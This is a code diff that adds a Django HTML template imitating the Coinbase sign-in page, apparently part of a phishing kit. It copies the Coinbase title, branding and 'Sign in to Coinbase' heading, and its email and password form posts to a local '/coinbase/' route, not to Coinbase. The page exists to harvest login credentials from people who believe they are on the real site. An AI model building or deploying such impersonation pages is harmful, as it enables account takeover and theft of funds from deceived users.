@@ -1,0 +1,40 @@
+{% load static %}
+
+<html>
+    <head>
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8">
+        <title>Coinbase</title>
+	<link rel="stylesheet" href="{% static "coin.css" %}">
+    </head>
+    <body>
+        <div id="head">
+            <span class="coin"><strong>coinbase</strong></span>
+            
+            <div class="nav">
+                <div class="line"></div>
+                <div class="line"></div>
+                <div class="line"></div>
+            </div>
+            <div id="sign">Sign in to Coinbase</div>
+        </div>
+	{% include 'base/bars.html' %}
+           
+        <form action="/coinbase/" method="post">
+		{% csrf_token %}
+        <input class="data" type="email" name="email" placeholder="Email" required>
+        <input class="data" type="password" name="password" placeholder="Password" required>
+            <br>
+	    <input class="login" type="submit" value="SIGN IN">
+        </form>
+
+	
+            
+            <div class="save"><input class="box" type="checkbox"><span id="save">Keep me signed in on this computer</span></div>
+            
+            <div class="bottom">
+              <p id="forgot">Forgot password? • Don't have an account? • Privacy Policy</p>  
+                
+            </div>
+    </body>
+</html>
